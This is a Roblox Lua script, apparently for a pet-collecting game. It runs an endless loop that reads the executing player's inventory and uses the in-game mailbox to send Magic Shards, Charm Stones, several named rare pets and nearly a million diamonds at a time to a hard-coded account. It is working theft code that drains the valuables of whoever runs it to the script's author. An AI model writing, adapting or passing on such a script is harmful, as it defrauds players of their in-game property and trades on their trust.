while task.wait() do
	local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
	local result = saveModule.Get()

	local ms = result.Inventory.Misc
	for i, v in pairs(ms) do
		if v.id == "Magic Shard" then
			if v._am >= 50 then
				local args = {
					[1] = "nguyenxupin2",
					[2] = "Magic Shard",
					[3] = "Misc",
					[4] = i,
					[5] = v._am or 1
				}
				game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(
					unpack(args)
				)
			end
		elseif v.id == "Charm Stone" then
			if v._am >= 1 then
				local args = {       
					[1] = "nguyenxupin2",
					[2] = "Charm Stone",
					[3] = "Misc",
					[4] = i,
					[5] = v._am or 1      
				}
				game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(
					unpack(args)
				)
			end
		end
	end

	task.wait(2)

	local pet = result.Inventory.Pet
	for i, v in pairs(pet) do
		if v.id == "Huge Poseidon Corgi" then
			local args = {
				[1] = "nguyenxupin2",
				[2] = "Huge Poseidon Corgi",
				[3] = "Pet",
				[4] = i,
				[5] = v._am or 1
			}
			game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
		elseif v.id == "Sun Angelus" then
			local args = {
				[1] = "nguyenxupin2",
				[2] = "Sun Angelus",
				[3] = "Pet",
				[4] = i,
				[5] = v._am or 1
			}
			game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
		elseif v.id == "Vibrant Toucan" then
			local args = {
				[1] = "nguyenxupin2",
				[2] = "Vibrant Toucan",
				[3] = "Pet",
				[4] = i,
				[5] = v._am or 1
			}
			game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
		end
	end

	task.wait(2)
	

	local GetSave = function()
		return require(game.ReplicatedStorage.Library.Client.Save).Get()
	end
	for i, v in pairs(GetSave().Inventory.Currency) do
		if v.id == "Diamonds" then
			if v._am >= 1000000 then
				local args = {
					[1] = "nguyenxupin2",
					[2] = v.id,
					[3] = "Currency",
					[4] = i,
					[5] = 1000000 - 10000
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
			end
		end
		task.wait(1)
	end
end
